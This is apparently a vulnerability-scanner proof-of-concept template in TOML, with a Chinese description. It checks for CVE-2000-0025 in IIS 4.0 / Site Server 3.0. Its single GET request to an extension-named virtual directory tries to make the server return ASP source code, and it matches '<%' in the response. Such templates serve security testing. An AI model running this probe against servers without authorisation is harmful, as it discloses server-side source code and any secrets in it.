[info]
author = "ave"
description = "检测 IIS 4.0 / Site Server 3.0 虚拟目录命名漏洞，通过包含扩展名（如 .com）的虚拟目录路径请求 ASP 文件，验证是否返回 ASP 源代码而非执行结果"
id = "POC-AVE-2000-0024"
name = "CVE-2000-0025 PoC"
severity = "medium"
tags = ["ave-2000-0024"]
vuln_id = [
    "CVE-2000-0025",
    "AVE-2000-0024",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/vdir.com/test.asp"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<%"]
